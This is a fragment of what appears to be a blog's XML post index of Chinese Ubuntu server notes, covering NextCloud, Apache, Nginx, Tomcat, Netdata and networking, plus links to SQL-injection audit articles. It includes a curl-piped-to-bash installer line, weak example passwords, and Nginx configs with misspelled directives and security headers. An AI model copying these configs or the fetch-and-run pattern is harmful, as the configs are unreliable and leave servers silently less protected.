php7.2-bz2 php7.2-intl# 配置phpsudo vim /etc/php/7.2/fpm/php.inicgi.fix_pathinfo=0date.timezone = Asia/shanghai 2.配置Nginx1234567891011121314# 这里使用默认站点# sudo vim /etc/nginx/sites-available/defaultindex index.php location ~\.php$ &#123; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include snippets/fastcgi-php.conf; include fastcgi_params; &#125;# 重启sudo nginx -tsudo systemctl restart nginx 3.访问, 验证环境是否成功 4.下载NextCloud123456# NextCloud 免费开源的个人云盘# 官网下载或wget下载wget https://download.nextcloud.com/server/releases/nextcloud-13.0.4.zipsudo unzip nextcloud-13.0.4.zip -d /var/www/html/mycloudsudo chown www-data:www-data -R /var/www/html/mycloud 5.建库12345-- 进入sql命令行create database mycloud;create user 'mycloud'@'localhost' identified by '12345678';grant all privileges on mycloud.* to 'mycloud'@'localhost' identified by '12345678' with grant option;;flush privileges; 6.生成证书(安全考虑)12# 这里使用自签名证书sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem 7.配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# cd /etc/nginx/site-available/# sudo vim mycloud.confserver &#123; listen 80; server_name www.mycloud.com; # 不让访问者通过http访问，强制重定向 return 301 https://www.mycloud.com$request_uri;&#125;server &#123; listen 443 ssl http2; # 证书位置 ssl_certificate /etc/ssl/certs/mysite.pem; ssl_certificate_key /etc/ssl/private/mysite.key; # 头部 add_header Strict-Teansport-Security "max-age-31536000" always; # ssl增强版协议的头部 # 等经验丰富后，自己要添加头部信息你 add_header X-Conten-Type-Option nosniff; add_header X-XSS-Protection "1;mode=block"; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Doamin-Policies none; root /var/www/html/mycloud/; location = /robots.txt &#123; allow all; log_not_found off; access_log off; &#125; location = /.well-known/carddav &#123; retun 301 $schema://$host/remote.php/dav; &#125; location = /.well-known/calddav &#123; retun 301 $schema://$host/remote.php/dav; &#125; location = /.well-known/acme-challenge &#123; allow all; &#125; client_max_body_size 512M; fastcgi_buffers 64 4K; gzip off; error_page 403 /core/templates/403.php; error_page 404 /core/templates/404.php; location = / &#123; rewrite ^ /ince.php$uri; &#125; location = /(?:build|tests|config|lib|3rdparty|templates|data)/ &#123; deny all; &#125; # .......&#125;## ......剩下详细的配置 8.启用站点配置123ln -s /etc/nginx/site-available/mycloud.conf /etc/nginx/site-enabled/mycloud.conf# reload 并 restart nginx 9.Data目录1234# 文件资源默认会在项目根目录下的Data目录# 建议不要放在默认位置, 这里放在上一级目录sudo mkdir /var/www/html/cloud_datasudo chown www-data:www-data -R /var/www/html/cloud_data 10.网页设置1234访问 https://xxxxx.com# 设置用户名/密码，数据库，data目录# 注意账户安全哦(不要设置admin等)# 修改语言 11.客户端1234sudo add-apt-repository ppa:nextcloud-devs/clientsudo apt install nextcloud-client# 或官网下载PC和android的客户端 其他Web应用1.Cockpit 基于Web的远程管理和系统监控 基于Web的远程管理应用 将所有组件打包在一起 不以来单独部署的LAMP/LEMP, 一条命令安装部署 安装1sudo apt install cockpit cockpit-docker 访问方式:123456https://www.com:9090登录账户同操作系统可以看到系统的详细信息，管理可以添加其他安装了Cockpit的服务器在一个机器的Web界面安装(前提是登录窗口时候进行勾选), 多台服务器 官网地址: https://cockpit-projece.org Netdata 基于Web建构的Linux系统实时性能监视工具 cpu, 内存，硬盘，网络，进程，硬件 占用系统资源少(1-3%) 实时自动告警 系统出问题之前，往往有异常的征兆 依赖包1sudo apt install git zlib1g-dev uuid-dev libmnl-dev gcc make autoconf autoconf-archive autogen automake pkg-config curl python python-yaml python-mysqldb python-psycopg2 nodejs lm-sensors netcat 安装1234567bash &lt;(curl -Ss https://my-netdata.io/kickstart-static64.sh) # 现在不能访问了# 或用apt安装sudo apt install netdata# 访问http://xxxxx.com:19999 开关1234567891011121314151617# 启动：位置根据系统会有不同。建议加上-D参数前台运行，不要后台运行$ sudo netdata -D$ 或$ sudo /usr/sbin/netdata -D# 或（Mac上）$ sudo /usr/local/sbin/netdata -D# 关闭（方法很多种，往往只有一种生效）$ sudo killall netdata# 或$ sudo pkill -9 netdata# 或$ sudo service netdata stop# 或$ sudo /etc/init.d/netdata stop# 或$ sudo systemctl stop netdata]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>LMAP</tag>
        <tag>LEMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-Web服务]]></title>
    <url>%2Fubuntu-server-Web%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[WWW介绍www 万维网 静态网站：所有人看到的内容都一样 动态应用程序： 数据库、中间件 每个用户看到的内容不同 根据用户输入返回不同结果 访问方式FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”） 传输协议SSL基本被替代了，TSL使用最多put常用于上传文件options查看都支持哪些方法header只是头部的信息(请求/响应) HTTP协议常见服务端响应状态码更多详细状态码，见地址： Apache2Apache软件基金会的一个开源Web服务器模块化强大的扩展能力： SSO模块 并发限制模块 日志监控模块 WAF模块 负载均衡模块 音乐/图像处理模块 安装123sudo apt install apache2# 默认侦听端口 TCP 80 通过众多directives进行配置在Ubuntu中，directives分散于多个配置文件中 配置文件：conf-enabled(启用的)中的文件都是链接到conf-available(可用的)下的配置文件（创建了链接的才生效的，所以可以配置一些备用的不设置链接），修改完需要重启服务模块目录：mods-enabled与mods-available，跟上面两者关系类似站点：sites-enabled与sites-available 不同ip以及不同端口可以映射不同的网站 –&gt; 同一个ip同一个端口来设置多个网站(不同域名都解析到这个ip, 服务端根据域名字段[主机头]来判断返回哪个页面) –&gt; 即为虚拟主机 虚拟主机简单配置 一般先从available目录开始创建，至于启用与否还得配置enabled本质上配置指令可以位于任何一个配置文件中 配置sites-available下讲解：12345678910# /etc/apache2/sites-available/000-default.conf # 默认虚拟主机&lt;VirtualHost *:80&gt; # 匹配ip，*代表任意ip , 侦听任意ip的80端口 ServerName www.example.com # 设置主机头（虚拟主机的域名） ServerAdmin webmaster@localhost # 报错时显示的管理员邮箱 DocumentRoot /var/www/html # 指定Web根目录 ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log # 报错日志 CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined # 访问日志 # 侦听端口&lt;/VirtualHost&gt; 实验创建ali和baid两个域名的虚拟主机1.创建新的虚拟主机（在sites-available）1234567891011121314# 复制两个配置文件sudo cp 000-default.conf ali.confsudo cp 000-default.conf baid.conf# 分别进行配置ServerName www.ali.comDocumentRoot /var/www/ali#ServerName www.baid.comDocumentRoot /var/www/baid# 分别编辑页面文件sudo vim /var/www/ali/index.htmlsudo vim /var/www/baid/index.html 2.创建链接(在sites-enabled)12345678910111213# 可以用ln 创建# apache提供了更简单的方式sudo a2ensite ali sudo a2ensite baid# 重新加载service apache2 reload## Note：ServerAlias *.lab.com # 域名通配符sudo a2ensite mynewSite # 启用虚拟主机sudo systemctl restart apache2.service # 重启服务sudo a2dissite mynewSite # 停用虚拟主机（禁用某个站点） 3.这里做实验，域名就简单通过hosts文件做了解析12192.168.11.130 www.ali.com192.168.11.130 www.baid.com 3.访问 侦听端口1/etc/apaches/ports.conf Apache中默认基本配置1.索引文件index：DirectoryIndex12345678## 可以根据需求,手动修改索引页的名称（一般不建议修改）# /etc/apache2/mods-available/dir.conf&lt;IfModule mod_dir.c&gt; DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm # 有先后的执行顺序&lt;/IfModule&gt;# Note：若没有正确放置index索引文件，会看到文件列表，可能会有安全隐患 2.html格式展示目录列表：Options【安全考虑】–&gt;去掉由于没有索引文件会显示文件列表的选项12345678## /etc/apache2/apache2.conf 主配置文件&lt;Directory /var/www/&gt; # 对文件目录权限的配置 Options Indexes FollowSymLinks # Indexes:若没有索引文件,就会显示目录列表;去掉Indexes就不会显示列表了，提示"权限拒绝" AllowOverride None Require all granted&lt;/Directory&gt;# 重启服务 3.Permission Denied 以上1,2两项都不匹配，就会显示”权限拒绝” 4.ErrorDocument 报错提示【安全考虑】–&gt; 默认404或报错页面会泄露信息或扫描器，建议替换为我们自定义的页面–&gt;不告诉用户不成功的具体原因,只告诉他出错了1234# /etc/apache2/conf-available/localized-error-pages.conf ErrorDocument 404 /error/404.html # 定义自己的页面# 重启服务 5.基于目录的Options1234567891011## /etc/apache2/apache2.conf 主配置文件&lt;Directory /var/www/&gt; Options Indexes &lt;/Directory&gt;# 其他配置项(权限要最小化原则，安全起见)ExecCGI # 允许CGI脚本执行的目录(/usr/lib/cgi-bin)Includes # 允许服务端包含（一个html包含另一个html,模板化）IncludeNOEXEC # 允许包含，但进展CGI脚本exec、include# 重启服务 6.环境变量123456# /etc/apache2/envvars 可以修改用户和组和pid等User /Group # 服务器端应答客户端访问的账号(www-data)PidFile # /var/run/apache2/apache2.pid# 最大并发数（默认8192）APACHE_ULIMIT_MAX_FILES='ulimit -n 65536' 模块化服务器核心只实现了基本功能1apache2 -l # 查看默认被编译到apache核心包里面的模块 其他功能通过模块实现ubuntu编译动态加载模块实现运行时模块调用1234apt search libapache2-mod # 搜索模块sudo apt install libapache2-mod0auth-mysql # 安装模块sudo a2enmod auth_mysql # 启用模块sudo a2dismod auth_mysql # 禁用模块 开启HTTPS传输过程中的CIA (机密性、完整性、可用性)，但是不提供应用层安全123456789101112131415161718192021222324252627282930313233# /etc/apache2/sites-available/default-ssl.confsudo a2ensite default-ssl # 开始ssl加密(默认未启动)sudo a2ebmod ssl # 默认未启动_default_:443 # 未指定虚拟主机情况下的443端口访问, 默认是443(除了其他指定了虚拟主机名的，未指定的就访问到这里)SSLEngine on # 开启SSl/TSLSSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem # 证书文件(默认已经自带了一张证书)SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.keySSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt # 证书的加密链文件SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl # 证书吊销列表SSLVerifyClient require # 要求客户端提供证书(不可抵赖性)&lt;FilesMatch "\.(cgi|shtml|phtml|php)$"&gt; # 基于文件类型，设置不同环境变量进行加密 SSLOptions +StdEnvVars&lt;/FilesMatch&gt;&lt;Directory /usr/lib/cgi-bin&gt; # 对指定目录 SSLOptions +StdEnvVars # 标准环境变量&lt;/Directory&gt;ssl-unclean-shutdown # 只是服务器端向客户端断开连接(追求速度)ssl-accurate-shutdown # 服务器端与客户端的连接端口了，客户端还有向服务端再确认(追求稳定性)nokeepalive ssl-unclean-shutdowndowngrade-1.0 force-response-1.0 # 降级响应# 还可以按自己需要...## 启用并重启服务sudo a2ensite default-sslservice apache2 reloadsudo systemctl restart apache.service## 可以访问了(ubuntu自己生成的证书浏览器会提示不安全) 证书向证书颁发机构申请的合法证书就可以替换ubuntu自带的证书12345# 使用CA机构签名证书sudo openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.pem# 使用自签名证书sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem 创建HTTPS虚拟主机和创建一般虚拟主机是类似的建议商业证书颁发机构(权威机构颁发，默认受信，增强特性，收费高昂，有效期长) 那没钱怎么办呢？有几家机构已经有免费的了，比如Let&#39;s encryptLet’s encrypt 致力于加速全文实现https的免费证书颁发机构 证书有效期90天(可刷新) 专门客户端程序 Certbot，简化证书步骤123sudo add-apt-repository ppa:certbot/certbot # 添加仓库sudo apt updatesudo apt install cerbot python-cerbot-apache 使用方法：1234567891011# 前提域名正常解析、设置好虚拟主机# 申请证书 (--apache意思是给apache用的， -d是域名,还有子域名)sudo certbot --apache -d example.com -d www.example.com# 证书位置/etc/letsencrypt/live# 查看证书状态(换成自己的域名)https://www.ssllab.com/ssltest/analyze.html?d=example.com&amp;latest Apache支持PHP1.安装123sudo apt install php7.2 libapache2-mod-php7.2 # mod-php模块# 验证 php -v 2.启用模块1234# 直接启用即可a2enmod php7.2# Apache对php的支持是模块化的，而Nginx对php支持的配置方式比较原始 索引文件1234vim /etc/apache2/mods-available/dir.conf # index.php# 重启sudo systemctl restart apache2 配置文件12/etc/php/7.2/ # 下面不同的目录，是针对不同应用的，这里apache的在apache子目录下面/usr/lib/php/7.2/ # 为不同的使用场景的配置文件(开发环境与生产环境，一般情况下会把这里的文件链接到上面的配置中) Keepalived高可用的一种解决方案：Keepalived 实现高可用(HA) 在服务器组内漂移的VIP（多台服务器实现一个组，但也是一个域名，解析到一个ip） Master独占VIP，其他Server检查Master可用性 Keepalives并非专门针对Apache而设计 常用于负载均衡技术环境 组内服务器应提供相同内容和配置 组内不同服务器有优先级，多个服务器共用一个漂移的ip地址(VIP)，处于正常状态的服务器叫Maste 安装1234sudo apt-get install keepalived# 因为无配置，所有默认启动失败/etc/keepalived/keepalived.conf # 配置文件（需要创建） 配置文件：12345678910111213141516171819202122232425# 可选配置项，但是一般建议配置global_defs &#123; notification_email &#123; myemail@mycompany.com # 发送邮件给谁 &#125; notification_email_from keepalives@mycompany smtp_server 192.168.1.150 smtp_connect_timeout 30 router_id mycompany_web_prod&#125;# 关键配置# 1号配置实例vrrp_instance VI_1 &#123; smtp_alter interface enp0s3 # 网卡接口优先级 virtual_router_id 51 # 定义服务器组 priority 100 # 优先级(自己定义，保证顺序即可) advert_int 5 # 周期性通告的间隔时间 virtual_ipaddress &#123; 192.168.1.200 # VIP（DHCP以外） &#125;&#125;# 重启服务 1234567891011systemctl start keepalived systemctl status -l keeplived# 网卡绑定VIP ip a 等待30s# 安装第二台服务器，并进行类似的配置(优先级修改,vip地址填写一样的)# 模拟切换systemctl stop keepalived systemctl start keepalived 不仅可以配合Apache使用，还可配合其他使用 Ubuntu 18.04新特性哈哈哈，前几天20.04都已经正式发布了，我听课进度太慢 内核是关键 网络配置多个地址，要用逗号分隔重启服务：sudo netplan apply 桥接的物理网卡设置为没有ip 桌面端： 123# ifconfig / ifup / if down 已经默认不安装了# 对应上面ip link set eth0 up / ip link set eth0 down networkctl命令12# 此命令地位更加突出networkctl status / networkctl status eth0 # 查看不同网卡的状态和详细信息 ip命令ip link12345678sudo ip link ens33 down # down掉, 相当于ifupsudo ip link ens33 up # 启动网卡, 相当于 ifdownip link ls ens33 # 查看网卡的link信息ip -s -d link ls ens33 # 查看网卡的link信息(更详细)ip -s -s -d link ls ens33 # 查看网卡的link信息(更更详细)ip link set dev ens33 mtu 1500 # 修改MTUip link set dev ens33 address 00:11:22:33:44:55 # 修改MAC ip addr123456ip addr # ip aip addr show # 跟上面没什么差别ip addr add dev ens33 192.168.1.10/24 # 手动给网卡添加ipip addr del dev ens33 192.168.1.10/24 # 手动给网卡删除ipip addr fulsh dev ens33 # 清除网卡信息 ip route1234ip route show # 查看路由信息 ip routeip route get 1.1.1.1 # 查看到达指定目的ip，计算要经过的路由sudo ip route default via 192.168.1.2 # 添加默认路由(网关地址)sudo ip route dev ens33 2.0.0.0/8 via 192.168.1.1 # 指定去往某个网络，都要经过1.1这个路由，并指定网卡进行转发 ip maddress1234# 组播地址ip maddress # 查看所有网卡都属于哪个组播地址ip maddress ls ens33 # 查看指定网卡属于哪个组播地址ip maddress add 33:33:00:00:00:01 dev ens33 # 把哪个网卡加入到某个组播地址 ip neighbor查arp缓存12345# 查看ip neighip -s -s neighbor show# 手动绑定ip与mac地址（防止arp欺骗） lladdr即逻辑链路层地址， perm是永久生效ip neighbor add dev ens33 192.168.0.131 lladdr 00:11:22:33:44:55 nud perm ip monitor监视网络里面地址等解析的变化12ip monitor all# 有着不同的状态 Nginx 开源，轻量，快速，可扩展的Web服务器 Github, Netflix, Wordpress都基于Nginx 但是可配置能力弱于Apache 适用于大流量，高并发环境（稳定快速，占用资源少–C10K问题） 在Top 1000个网站中使用率最高 Apache基于线程 基于进程(运行中的文件就叫进程)消耗资源多 同进程下的多线程共享内存（一损俱损） Nginx使用事件驱动的架构 新客户端请求时不创建新的进程/线程 事件处理器处理请求任务 更少的处理时间，更少的内存消耗 Apache与Nginx共用 Apache处理动态内容 Nginx处理静态内容 安装123sudo apt install nginx# 配置文件在 /etc/nginx 配置文件12345678# /etc/nginx# 主配置文件 nginx.conf# 虚拟主机配置文件sites-availablesites-enabled # 启用的，是个链接snippets # 可以复用的片段 主配置文件1234567891011121314151617181920212223# /etc/nginx/nginx.confuser www-data; # 用户worker_processes auto; # 进程数include /etc/nginx/modules-enabled/*.conf; # 引入的模块配置events &#123; worker_connections 768; # 每个进程最大的并发连接数 # multi_accept on;&#125;http &#123; sendfile on; # 对内核 静态资源的访问速度(都要开着) tcp_nopush on; # 优化了对tcp协议栈性能(优化了数据包的大小,多个小包变成大包再发) tcp_nodelay on; # 与上面的参数相反(从发包的延时进行优化,来一个包就发) keepalive_timeout 65; # 没一个TCP连接最大的保活的时间 types_hash_max_size 2048; # MIME类型镜头内容hash表大小 ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*;&#125; 虚拟主机配置文件ip和端口一样，使用不同域名来指向不同站点12345678910111213141516# /etc/nginx/sites-available/ # 可用站点# /etc/nginx/sites-enabled/ # 已启用站点# /etc/nginx/sites-available/defaultserver&#123; listen 80 default_server; # 侦听的端口 root /var/www/htmll; # 根目录 index index.html index.htm index.nginx-debian.html; # 索引文件 server_name www.xpsshuai.cn; # 主机名(域名)&#125;location / &#123; # 主url # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; # 资源没有就404&#125; 新建虚拟主机(Server Blocks)实例 Nginx中叫服务器块，但东西跟Apache中虚拟主机是一样的 123456789101112131415161718192021222324sudo mkdir /var/www/qq.com# 每个单独的Server Block一个配置文件sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/qq.comsudo vim /etc/nginx/sites-available/qq.com # 内容server&#123; listen 80; # 因为这里都侦听80端口，所以为了和默认站点区分，要指定不同域名 server_name www.qqq.com; root /var/www/qq.com; &#125;# 其他配置项可以取消注释自行配置location ~ /\.ht &#123; # 这个建议启用，以..开头,以ht结尾的你我们就拒绝访问--&gt;当然也可以增加更多策略 deny all;&#125;# 创建启用的符号链接(Apache是site2enable，这里没有专门的命令)sudo ln -s /etc/nginx/sites-available/qq.com /etc/nginx/sites-enabled/qq.com # 重启sudo systemctl restart nginx# 访问域名，就会访问到qq.com，因为请求中的host字段是不一样的# 其他站点同上 Nginx支持PHPWebServer本身只是提供资源的，必须配合php等脚本才能进行逻辑的运算 1.安装fastCGI process manager(FPM) –&gt; 就能配合Nginx配合进行处理(Nginx把接收到的请求转发给php处理)123456sudo apt install php-fpm # 安装# 查看位置 ls /var/run/php//var/run/php/php7.2-fpm.sock # 进程名称(记住路径)# 验证 php-v 2.配置Nginx123456# 修改配置 sudo vim /etc/nginx/sites-available/qq.comlocation ~ \.php$ &#123; # 匹配所有访问.php的请求 include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # 意思是: 把所有访问.php的拓展名的资源，都转发给这里pass的php进程 &#125;# 还有，索引页面也要添加 index.php 3.配置PHP12345678# sudo vim /etc/php/7.2/fpm/php.ini# 这里只简单讲几个配置cgi.fix_pathinfo=0 # 必须修改为0, 安全file_uploads = On # 如果不需要就关掉，看自己需求max_file_uploads = 20 # 限制单个文件上传大小allow_url_fopen = On # 是否允许文件包含(如果没业务需要，建议关闭)allow_url_include = Offmemory_limit = 128M # 指定内存大小(最小128M,看业务需求) 4.重新加载1234sudo nginx -tsudo systemctl reload nginx# 重启phpsudo systemctl restart php7.2-fpm 5.重新访问php页面，查看是否正确解析 Nginx支持SSL自签名证书 (自己测试或者不需要那么安全的情况下) –&gt; 机密性和完整性可以保证，但是身份认证是不会被公网所信任的12345# x509标准格式的, 私钥是绝对不能泄漏的, 后面是绑定的一个证书sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/qq.key -out /etc/ssl/certs/qq.pem# 一旦域名绑定了证书，就必须通过这个域名来访问# 若向CA证书颁发机构申请证书方法 同上Apache 服务块配置123456789101112131415# sudo vim /etc/nginx/sites-available/qq.comserver &#123; listen 443 ssl; # 443端口是 ssl, 通过https访问 server_name www.qqq.com; ssl_certificate /etc/ssl/certs/qq.pem; ssl_certificate_key /etc/ssl/private/qq.key; root /var/www/qq.com&#125;# 重启服务systemctl restart nginx# 访问https://xxxxxx 会发现浏览器会提示证书不信任 Let’s encrypt第三方的https的开源的免费证书颁发机构，向他来申请证书 1.安装1234sudo add-apt-repository ppa:certbot/certbot # 添加仓库sudo apt updatesudo apt install cerbot # 客户端程序(简化了申请流程)sudo apt install python-cerbot-nginx 2.使用方法：1234567891011121314151617181920# 前提域名正常解析、设置好虚拟主机# 2.1申请证书 (--nginx意思是给nginx用的， -d是域名,还有子域名) , -m是管理员邮箱sudo certbot --nginx -d example.com -d www.example.com -m admin@example.com# 证书存放位置/etc/letsencrypt/live# 2.2修改自己配置文件中证书的位置# sudo vim /etc/nginx/sites-available/qq.comssl_certificate# 2.3 手动证书更新(因为默认证书有效期是90天)sudo certbot renew --dry-run# 2.4测试 查看证书状态(输入自己的域名) 可以查看到一些安全隐患等详细信息https://www.ssllab.com/ssltest/# ssl的信息扫描(不安全的地方)也可以使用自己本地的工具 Nginx反向代理 很多情况下，Nginx不是作为WebServer使用的，最常见的就是作为反向代理 首先说一下代理: 代理客户端访问外网服务器。代理是重新生成的请求(比如公司内部限制员工上网的场景)反向代理： - 代理服务器对外提供服务，接受客户端请求 - 安全层过滤客户端恶意请求(云) - 可以放在防火墙外面，甚至放在云上(云WAF本质上就是反向代理, 请求通过DNS解析到云waf上，进行过滤) Apache不适用于高并发，高负载环境 Nginx没有内建支持动态内容处理能力 结合Apache/Nginx的优势 Nginx接受入站请求和静态内容缓存，动态请求发给Apache Apache完成动态内容处理 Nginx作为反向代理（动态请求转发给Apache） Nginx放在WebServer前面，再将请求发给WebServer。然后服务端把数据通过Nginx向用户交付数据 不仅减缓了Apache的流量压力，也进行了一定的安全过滤 Nginx实现反向代理 同一台服务器的流量转发 1.本机安装Apache1234注意: 先停掉nginx的服务systemctl stop nginx再安装sudo apt install apache2 2.修改Apache侦听端口12345678910111213141516171.# vim /etc/apache2/ports.conf#让apache不占用80, 让nginx侦听80端口 Listen 8080&lt;IfModule ssl_module&gt; Listen 8443&lt;/IfModule&gt;&lt;IfModule mod_gnutls.c&gt; Listen 8443&lt;/IfModule&gt;2.修改apache虚拟站点默认侦听端口vim /etc/apache2/sites-available/000-default.conf也改为80803.重启服务systemctl restart apache2 3.Nginx反向代理设置12345678910111213141516# vim /etc/nginx/sites-available/default#修改nginx配置，侦听80端口，然后动态部分的流量转发给apache,而静态文件还是放Nginx上读取(这里以php为例)# 动态内容进行转发location ~ \.php$ &#123; include snippets/fastcgi-php.conf; # fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # 这里就不用nginx解析php了，用apache(配置在上面小结) proxy_pass http://127.0.0.1:8080; # 凡是php的动态内容都转发给本机的8080(即Apache) proxy_set_header X-Real-IP $remote_addr; # 通常会添加一些代理请求头(便于区分) proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 这个头部虽然不是RFC标准，但是也是记录了经过了哪些代理地址 proxy_set_header Host $host; proxy_set_header X-Forward-Proto $scheme; &#125;# 静态内容留给自己（增加一个location） location ~* \.(js|css|jpg|png|svg|html|htm)$ &#123; expires 10d; # 指定过期时间 10天&#125; 4.检查Nginx配置并重启12sudo nginx -t # 检查配置语法sudo systemctl restart nginx # 重启 5.配置Apache支持php解析12345678910111213# 1.安装sudo apt install php7.2 libapache2-mod-php7.2 # mod-php模块# 验证 php -v# 2.启用模块a2enmod php7.2# 3.索引文件vim /etc/apache2/mods-available/dir.conf # 增加index.php# 4.重启apachesudo systemctl restart apache2 6.测试能否正常访问 多台服务器的Nginx反响代理，进行流量转发实验环境：一台ubuntu安装apache, 两台虚拟机安装Nginx客户端向第一台Nginx服务器发送请求，转发给第二台Nginx服务器，然后转发给最后一台Apache链式代理 1.Nginx机器 N11.安装Nginx2.配置(这里做实验就简单地用了默认的配置了)1234# /etc/nginx/sites-available/defaultlocation / &#123; # 所有发到我这里的请求都转发给N2 proxy_pass http://192.168.0.104;&#125; 3.重启Nginx 2.Nginx机器 N21.安装Nginx2.配置1234# /etc/nginx/sites-available/defaultlocation / &#123; # 所有发到我这里的请求都转发给N2 proxy_pass http://192.168.0.105;&#125; 3.重启Nginx 3.Apache机器 A3安装apache然后客户端访问N1, 就会看到A3的页面 Nginx负载均衡 基于反向代理实现负载均衡 负载均衡： 前面放一个Nginx进行反向代理，后面放多个Apache作为WebServer 基本配置12345678910111213# 定义一个服务器组(要转发到的目标组)upstream srvs &#123; # upstream只是一个组的名称 least_conn; # 负载均衡方法规则 --最少连接数优先 (详细见下面) server 192.168.106:80 weight=1; # server 是后面的一个WebServer(apache或Nginx)的地址， weight 是权重(越大接收的流量就越多) server 192.168.106:80 weight=2; &#125;# 配置server &#123; location / &#123; proxy_pass http://srvs; # 上面定义的组的名称(不需要被DNS解析，仅仅是一个标识) &#125;&#125; 负载均衡方法12345round-robin # 论询least_conn # 最少连接数优先(已经建立的连接数)least_time # 响应速度最快hash # 基于请求的Hash值ip_hash # 基于ip地址的hash值(适用于需要会话保持的场景) 日志12/var/log/nginx/access.log/var/log/nginx/error.log TomcatTomcat是由Apache组织开发的一个Servlet(Server Applet)容器 实现对servlet, JSP, JAVA Socket等支持 包含http服务器 作为中间件使用 可与Nginx结合使用(只用Tomcat的话, 抗压能力强) servlet是优于CGI的方式的 安装 open jdk一般tomcat和java配合较多jdk是开发环境，jre是运行环境1sudo apt install default-jdk #安装openjdk。 使用默认版本 或者指定openjdk-8-jdk 安装 oracle jdk安装123sudo apt install software-properties-common -ysudo add-apt-repository ppa:webupd8team/javasudo apt install oracle-java8-installer -y java版本选择1234sudo update-alternatives --config javasudo update-alternatives --config javacjava --version 或者手动下载oracle jdk包 官方库安装tomcat1234567# ubuntu中收录的8sudo apt install tomcat8sudo apt install tomcat8-docssudo apt install tomcat8-adminsudo apt install tomcat8-examples# tomcat默认不是主要作为WebServer的，一般是配合Apache和Nginx，所以默认使用8080端口 手动安装tomcat适用于指定具体版本1.先安装jdk123456sudo apt install default-jdk #安装openjdk。 使用默认版本 或者指定openjdk-8-jdk # 验证java --versionsudo useradd -m -U -d /opt/tomcat -s /bin/false tomcat # 创建tomcat帐号（home放在opt下面） 2.再下载安装包 3.移动到/opt/tomcat目录1mv apache-tomcat-8.5.31 /opt/tomcat/ 4.修改该文件递归的属主属组改为新建的tomcat用户123456# 建议建立符号链接 sudo ln -s /opt/tomcat/apache-tomcat-8.5.31 /opt/tomcat/latest # 把新版本添加链接即可(版本更新之后不需要更改配置文件，配置文件都配置latest,而只需把latest修改指向即可)sudo chown -R tomcat:/opt/tomcatsudo chmod +x /opt/tomcat/latest/bin/*.sh# sudo chmod +x /opt/tomcat/apache-tomcat-8.5.31/bin/*.sh 手动创建systemd管理文件(手动安装就没有systemd的后台管理文件)/etc/systemd/system/sudo vim tomcat.service配置内容如下 6.启动服务1234567# 重新reloadsudo systemctl daemon-reload# 启动tomcatsudo systemctl start tomcatsudo systemctl status tomcat# 设置开机启动启动sudo systemctl enable tomcat 7.Web管理接口配置123456789101112131415161718192021# http://ip:8080/manager/# tomcat管理页面，默认是只允许本机访问的## 1.若想开启，就需进行配置（这里指定允许某个ip访问）sudo vim /opt/tomcat/latest/conf/tomcat-user.xml # 自动安装tomcat后的路径在/etc&lt;tomcat-user&gt; &lt;role rolename="admin-gui"/&gt; # 定义两个角色 &lt;role rolename="manager-gui"/&gt; &lt;user username="admin" password="qwe123" roles="admin-gui, manager-gui"/&gt; # 定义用户&lt;/tomcat-user&gt;## 2.指定登录主机# sudo vim /opt/tomcat/latest/webapps/manager/META-INF/context.xml # 自动安装tomcat后的路径自己找如下图(懒得弄格式了)# sudo vim /opt/tomcat/latest/webapps/host-manager/META-INF/context.xml这是管理主机的配置文件## 3.重启服务，然后测试systemctl restart tomcat8xxx:8080/manager/html # 管理页面就可以部署war包等操xxx:8080/host-manager/html]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>Web服务</tag>
        <tag>Apache</tag>
        <tag>Nginx</tag>
        <tag>Tomcat</tag>
        <tag>反向代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PHP代码审计】 那些年我们一起挖掘SQL注入--集合]]></title>
    <url>%2F%E3%80%90PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E6%8C%96%E6%8E%98SQL%E6%B3%A8%E5%85%A5-%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[仅仅是简单把网上的文章放在一起，方便自己学习 https://www.cnblogs.com/xiaozi/p/5538369.html https://www.cnblogs.com/xiaozi/p/5538372.html https://www.cnblogs.com/xiaozi/p/5538374.html http://www.mamicode.com/info-detail-1391858.html https://www.cnblogs.com/xiaozi/p/5538380.html https://www.cnblogs.com/xiaozi/p/5538382.html https://www.cnblogs.com/chunguang/p/5583875.html]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>代码审计</tag>
      </tags>
